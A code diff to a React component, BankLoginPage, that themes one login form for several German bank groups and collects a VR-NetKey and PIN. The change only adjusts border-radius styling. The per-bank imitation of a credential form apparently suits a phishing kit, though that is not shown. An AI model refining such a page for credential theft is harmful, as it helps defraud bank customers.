@@ -258,6 +258,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
 
   const themeColor = theme.headerBg === "#ffffff" ? "#1a1a1a" : theme.headerBg;
+  const buttonBorderRadius = theme.buttonRadius === "rounded-full" ? "9999px" : "0px";
   const isVR = bank?.group === "Volksbanken Raiffeisenbanken";
   const isPSD = bank?.group === "PSD Banken";
   const isSparda = bank?.group === "Sparda-Banken";
@@ -606,7 +607,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
               </div>
 
               {errorMsg && (
-                <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: theme.buttonRadius }}>
+                <div className="mb-4 bg-red-50 border border-red-200 p-4 flex items-start gap-2" style={{ borderRadius: buttonBorderRadius }}>
                   <AlertCircle className="w-4 h-4 mt-0.5 text-red-600 shrink-0" />
                   <p className="text-sm text-red-600 font-medium">{errorMsg}</p>
                 </div>
@@ -614,7 +615,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
-                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: theme.buttonRadius }}>
+                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: buttonBorderRadius }}>
                     <input
                       id="vrNetKey"
                       type="text"
@@ -622,7 +623,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: theme.buttonRadius }}
+                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: buttonBorderRadius }}
                       autoComplete="username"
                     />
                     <label
@@ -642,7 +643,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                 </div>
 
                 <div>
-                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: theme.buttonRadius }}>
+                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: buttonBorderRadius }}>
                     <input
                       id="pin"
                       type={showPin ? "text" : "password"}
@@ -650,7 +651,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: theme.buttonRadius }}
+                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: buttonBorderRadius }}
                       autoComplete="current-password"
                     />
                     <label
